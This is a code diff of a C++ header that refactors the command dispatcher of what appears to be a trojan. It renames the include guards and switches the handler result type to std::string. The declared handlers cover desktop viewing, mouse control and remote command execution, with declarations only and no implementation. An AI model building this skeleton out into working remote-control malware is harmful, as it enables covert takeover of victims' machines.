@@ -1,7 +1,7 @@
 #pragma once
 
-#ifndef __COMMANDS_H_INCLUDED__
-#define __COMMANDS_H_INCLUDED__
+#ifndef __COMMANDS_HPP_INCLUDED__
+#define __COMMANDS_HPP_INCLUDED__
 
 #include "..\Constants.h" // TODO: Remove, when all functions will be enabled
 
@@ -32,7 +32,7 @@ typedef struct
 	INT    code;
 } PAIR;
 
-typedef VOID(*trojan_task)(CONST PVOID args, PTCHAR result);
+typedef VOID(*trojan_task)(CONST PVOID args, std::string &result);
 
 typedef struct
 {
@@ -40,18 +40,11 @@ typedef struct
 	trojan_task task;
 } MAP;
 
-#ifdef __cplusplus
-extern "C" {
-#endif /* __cplusplus */
-
-VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result);
-VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result);
-VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result);
-VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result);
-
-#ifdef __cplusplus
-} // extern "C"
-#endif /* __cplusplus */
+std::string ExecuteCommand(INT code, std::string &args);
+VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result);
+VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result);
+VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result);
+VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result);
 
 static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
 {
@@ -63,4 +56,4 @@ static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
 INT          cmd2code(CONST PTCHAR cmd);
 CONST PTCHAR code2cmd(INT cmd);
 
-#endif /* __COMMANDS_H_INCLUDED__ */
+#endif /* __COMMANDS_HPP_INCLUDED__ */
